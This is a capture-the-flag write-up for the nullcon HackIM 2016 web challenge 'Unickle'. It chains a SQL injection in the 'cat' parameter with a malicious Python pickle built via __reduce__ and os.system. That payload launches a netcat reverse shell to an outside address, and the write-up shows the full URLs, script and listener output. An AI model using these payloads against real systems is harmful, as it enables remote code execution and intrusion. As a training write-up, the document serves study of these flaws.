# nullcon HackIM : Unickle

**Category:** Web
**Points:** 200
**Solves:** 
**Description:**

> OSaaS is the new trend for 2016! Store your object directly in the cloud. Get rid of the hassle of managing your own storage for object with Osaas. Unickle currently offers a beta version that demonstrates how OSaaS will make the internet a better place... One object at a time!!
> 
> 
> <http://54.84.124.93/>

[Server files](./var/www)

## Write-up

**by d1rt**

Immediately on visiting the target URL you're greeted with a list of "objects", each has an id.

`http://54.84.124.93/?cat=1`

The `cat` param is a sql injection opportunity

`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,3,4--`

This injection leads to a Python error being printed on the final row of the output table in the 3rd field.

`1    2    'int' object has no attribute 'encode'  4`

This means we now control a payload that is being passed to Python for execution, based on the output of other fields and hints in intro, it's a Python object injection flaw.  Now we craft our injected object.

```
#!/usr/bin/python2

import pickle
import os

class Inject(object):
    def __reduce__(self):
        return (os.system, ('/bin/ls',))

print pickle.dumps(Inject())
```

Confirm it works

```
$ ./makepickle.py 
cposix
system
p0
(S'/bin/ls'
p1
tp2
Rp3
.
```

Not sqli friend, need to change out those new lines

```
$ ./makepickle.py | awk '{printf $1"%0a"}'
cposix%0asystem%0ap0%0a(S'/bin/ls'%0ap1%0atp2%0aRp3%0a.%0a
```

Now use it in the injection

`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,%27cposix%0asystem%0ap0%0a(S'/bin/ls'%0ap1%0atp2%0aRp3%0a.%0a%27,4--`

We have a functional injection, but not the value we'd expected

`1    2   512  4`

We then use the injection to trigger a reverse shell using netcat

`http://54.84.124.93/?cat=1/**/or/**/1=1/**/union/**/all/**/select/**/1,2,%27cposix%0asystem%0ap0%0a(S'/bin/nc -e/bin/bash 1.3.3.7 31337'%0ap1%0atp2%0aRp3%0a.%0a%27,4--`

```
$nc -vvv -l -p 31337
Listening on any address 31337
Connection from 54.84.124.93:47281
find / -name 'flag'
/var/www/flag
cat /var/www/flag
flag{OSaaS_with_union_and_tickle_trend_it_is!}
```


## Other write-ups and resources

* <https://github.com/bl4de/ctf/blob/master/2016/HackIM_2016/Unicle_Web200/Unicle_Web200_writeup.md>
